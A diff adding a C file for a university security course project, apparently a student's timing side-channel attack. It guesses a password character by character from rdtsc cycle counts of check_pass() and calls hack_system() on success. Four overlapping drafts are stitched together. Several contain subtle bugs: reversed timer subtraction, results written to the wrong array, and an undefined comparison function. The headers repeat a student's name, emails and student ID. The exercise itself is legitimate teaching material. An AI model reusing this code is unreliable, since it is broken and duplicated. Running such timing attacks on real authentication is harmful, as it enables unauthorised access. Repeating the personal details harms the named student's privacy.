@@ -1,0 +1,371 @@
+/*******************************************************
+ CSE127 Project
+ User routines file
+ 
+   Name: 	Angela To 
+   Email: 	to.angeac@gmail.com / a4to@ucsd.edu
+   Student ID: 	A10657395
+   Date:	10/21/15
+
+  You can change anything in this file, just make sure 
+  that when you have found the password, you call 
+  hack_system() function on it.
+
+ *******************************************************/
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include "sysapp.h" // include our "system" header
+
+
+/* Read cycle counter 
+ * Invokes the processesor's cycle counter (a clock that increments by one per 
+ * cycle pass). Treat rdtsc() as a free running timer that returns a long.
+ * */
+#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })
+
+
+/* CMPFUNC : int 
+ * Comparison function used for qsort */
+int cmpfunc (const void* a, const void* b) {
+	return (*(unsigned long*)a - *(unsigned long*)b);
+}
+
+
+/* COMPUTE_MEDIAN : float
+ * Computes the median of array elements */
+float compute_median(unsigned long *arr, int arr_len) {
+	qsort(arr, arr_len, sizeof(unsigned long), cmpfunc);
+	if (arr_len % 2 == 0 ) {
+		float m1 = (float)(arr[arr_len/2] + (float)arr[arr_len/2 -1]) / 2.0;
+		return m1;
+	} else {
+		float m2 = arr[arr_len/2];
+		return m2;
+	}	
+}
+
+
+int main(int argc, char ** argv) {
+	char* ASCII = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(){}[]|:;'<>,.?/~`";
+	int   BUFFLEN = 33;
+	int   TRIALS  = 100;
+	int   i, j, k, l; 
+
+	int   d; //TODO DELETE
+
+	unsigned long  trials[TRIALS];	// For computing median time for char
+	unsigned long  t1, t2, max;	
+
+	float times[strlen(ASCII)];	// For selecting "best" char
+	float med;
+
+	char  guess[BUFFLEN];		
+	char  guess_ch;
+
+	// set guess to zeros
+	bzero(guess, sizeof(guess));
+
+	// do the guessing (this is where your code goes)
+        // we suggest a loop over the size of the possible 
+        // password, each time trying all possible characters
+        // and looking for time deviations
+
+	// Loop through length of guess string
+	for (i = 0; i < BUFFLEN; i++) {
+		// Loop through all possible ASCII characters
+		for (j = 0; j < strlen(ASCII); j++) {
+			// Try the current character
+			guess[i] = ASCII[j];
+
+			// Run through the trials, collect times for current guess
+			for (k = 0; k < TRIALS; k++) {
+				t1 = rdtsc();
+				if (check_pass(guess)) {
+					printf("Password Found!\n");
+					hack_system(guess);
+				}
+				t2 = rdtsc();
+				times[k] = t1 - t2;
+			} 
+/* DEBUG
+for(d = 0; d < TRIALS; d++) {
+	printf("\t FOR CHAR %c: trials[%d] = %lu\n", ASCII[j], d, trials[d]);
+}
+*/
+			// Get the median compute time for current char
+//			med = compute_median(trials, TRIALS);
+//			times[j] = med;
+			qsort(trials, TRIALS, sizeof(unsigned long), cmpfunc);
+			times[j] = trials[49];
+		} 
+		
+		// Select the character with the longest "aggregate" compute time
+		max = 0; 
+		guess_ch = '\0';
+		for (l = 0; l < strlen(ASCII); l++) {
+			if(times[l] > max) {
+				guess_ch = ASCII[l];
+				max = times[l];
+			}		
+		}
+//printf("\t FOR ITR %d: %c HAS BEST TIME = %lu\n", i, guess_ch, max);
+		// Set guess to best guess
+		guess[i] = guess_ch;
+		printf("%d CHARACTER SELECTED: %c\n", i, guess_ch);
+	} 
+	printf("Could not get the password!  Last guess was %s\n", guess);
+	return 1;
+};
+
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////
+/*******************************************************
+ CSE127 Project
+ User routines file
+ 
+   Name: 	Angela To 
+   Email: 	to.angeac@gmail.com / a4to@ucsd.edu
+   Student ID: 	A10657395
+   Date:	10/21/15
+
+  You can change anything in this file, just make sure 
+  that when you have found the password, you call 
+  hack_system() function on it.
+
+ *******************************************************/
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include "sysapp.h" // include our "system" header
+
+
+/* Read cycle counter 
+ * Invokes the processesor's cycle counter (a clock that increments by one per 
+ * cycle pass). Treat rdtsc() as a free running timer that returns a long.
+ * */
+#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })
+
+
+/* CMPFUNC : int 
+ * Comparison function used for qsort */
+int cmpfunc (const void* a, const void* b) {
+	return ( *(unsigned long*)a - *(unsigned long*)b );
+}
+
+
+/* COMPUTE_MEDIAN : float
+ * Computes the median of array elements */
+float compute_median(unsigned long *arr, int arr_len) {
+	qsort(arr, arr_len, sizeof(unsigned long), cmpfunc);
+	if (arr_len % 2 == 0 ) {
+		float m1 = (float)(arr[arr_len/2] + (float)arr[arr_len/2 -1]) / 2.0;
+		return m1;
+	} else {
+		float m2 = arr[arr_len/2];
+		return m2;
+	}	
+}
+
+
+int main(int argc, char ** argv) {
+	char* ASCII = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(){}[]|:;'<>,.?/~`";
+	int   BUFFLEN = 33;
+	int   TRIALS  = 100;
+	int   i = 0; 
+	int   j = 0; 
+	int   k = 0; 
+	int   l = 0; 
+
+	long  trials[TRIALS];	// For computing median time for char
+	long  t1, t2, max;	
+
+	float times[strlen(ASCII)];	    // For selecting "best" char
+	float med;
+
+	char  guess[BUFFLEN];		
+	char  guess_ch;
+
+	// set guess to zeros
+	bzero(guess, sizeof(guess));
+
+	// do the guessing (this is where your code goes)
+        // we suggest a loop over the size of the possible 
+        // password, each time trying all possible characters
+        // and looking for time deviations
+
+
+	for (i = 0; i < BUFFLEN; i++) {
+		max = 0;
+		for (j = 0; j < strlen(ASCII); j++) {
+			guess[i] = ASCII[j];
+			
+			for (k = 0; k < TRIALS; k++) {
+			
+				t1 = rdtsc();
+				if (check_pass(guess)) {
+					printf("Password Found!\n");
+					hack_system(guess);
+				}
+				t2 = rdtsc();
+				
+				trials[k] = t1 - t2;
+			} 
+			qsort(trials, TRIALS, sizeof(long), cmpfunc);
+			if (max < trials[49]) {
+			    max = trials[49];
+			    guess_ch = ASCII[j];
+			}
+		} 
+		guess[i] = guess_ch;
+		printf("%d CHARACTER SELECTED: %c\n", i, guess_ch);
+	} 
+	printf("Could not get the password!  Last guess was %s\n", guess);
+	return 1;
+};
+
+
+
+////////////////////////////////////////////////////////////////////////////////
+/*******************************************************
+ CSE127 Project
+ User routines file
+ 
+   Name: 	Angela To 
+   Email: 	to.angeac@gmail.com / a4to@ucsd.edu
+   Student ID: 	A10657395
+   Date:	10/21/15
+
+  You can change anything in this file, just make sure 
+  that when you have found the password, you call 
+  hack_system() function on it.
+
+ *******************************************************/
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include "sysapp.h" // include our "system" header
+
+
+/* Read cycle counter 
+ * Invokes the processesor's cycle counter (a clock that increments by one per 
+ * cycle pass). Treat rdtsc() as a free running timer that returns a long.
+ * */
+#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })
+
+
+/* CMPFUNC : int 
+ * Comparison function used for qsort */
+int cmpfunc (const void* a, const void* b) {
+	return ( *(unsigned long*)a - *(unsigned long*)b );
+}
+
+
+/* COMPUTE_MEDIAN : float
+ * Computes the median of array elements */
+float compute_median(unsigned long *arr, int arr_len) {
+	qsort(arr, arr_len, sizeof(unsigned long), cmpfunc);
+	if (arr_len % 2 == 0 ) {
+		float m1 = (float)(arr[arr_len/2] + (float)arr[arr_len/2 -1]) / 2.0;
+		return m1;
+	} else {
+		float m2 = arr[arr_len/2];
+		return m2;
+	}	
+}
+
+
+int main(int argc, char ** argv) {
+	char* ASCII = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(){}[]|:;'<>,.?/~`";
+	int   BUFFLEN = 33;
+	int   TRIALS  = 100;
+	int   i = 0; 
+	int   j = 0; 
+	int   k = 0; 
+	int   l = 0; 
+
+	unsigned long  trials[TRIALS];	// For computing median time for char
+	unsigned long  t1 = 0;
+	unsigned long  t2 = 0; 
+	unsigned long  max = 0;	
+
+	float times[strlen(ASCII)];	    // For selecting "best" char
+	float med = 0.0;
+
+	char  guess[BUFFLEN];		
+	char  guess_ch = '\0';
+
+	// set guess to zeros
+	bzero(guess, sizeof(guess));
+
+	// do the guessing (this is where your code goes)
+        // we suggest a loop over the size of the possible 
+        // password, each time trying all possible characters
+        // and looking for time deviations
+
+	for (i = 0; i < BUFFLEN; i++) {
+		max = 0;
+		for (j = 0; ASCII[j]; j++) {
+			guess[i] = ASCII[j];
+			for (k = 0; k < 100; k++) {
+				t1 = rdtsc();
+				if (check_pass(guess)) {
+			        printf("%s\n","Guessed it?");
+					hack_system(guess);
+				}
+				t2 = rdtsc();
+				trials[k] = (t1 - t2);
+			}
+			qsort(trials, 100, sizeof(unsigned long), cmpfunc);
+			if (trials[49] > max) {
+				max = trials[49];
+				guess_ch = ASCII[j];
+			}
+		}
+		guess[i] = guess_ch;
+		printf("%d CHAR: %c\n", i, guess[i]);
+	}
+	printf("Could not get the password!  Last guess was %s\n", guess);
+	return 1;
+};
+
+////////////////////////////////////////////////////////////////////////////////
+int main(int argc, char ** argv) {
+	char 		guess[17];
+	char            chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+	char            best_char;
+	int             i, j;
+	int             len;
+	int             max;
+	unsigned long   t_s;
+	unsigned long   t_e;
+	unsigned long   times[100];
+         
+	bzero(guess, sizeof(guess));
+	for (len = 0; len < 16; len++) {
+		max = 0;
+		for (i = 0; chars[i]; i++) {
+			guess[len] = chars[i];
+			for (j = 0; j < 100; j++) {
+				t_s = rdtsc();
+				if (check_pass(guess))
+					hack_system(guess);
+				t_e = rdtsc();
+				times[j] = t_e - t_s;
+			}
+			qsort(times, 100, sizeof(unsigned long), int_cmp);
+			if (times[49] > max) {
+				max = times[49];
+				best_char = chars[i];
+			}
+		}
+		guess[len] = best_char;
+	}
+	return 1;
+}
+
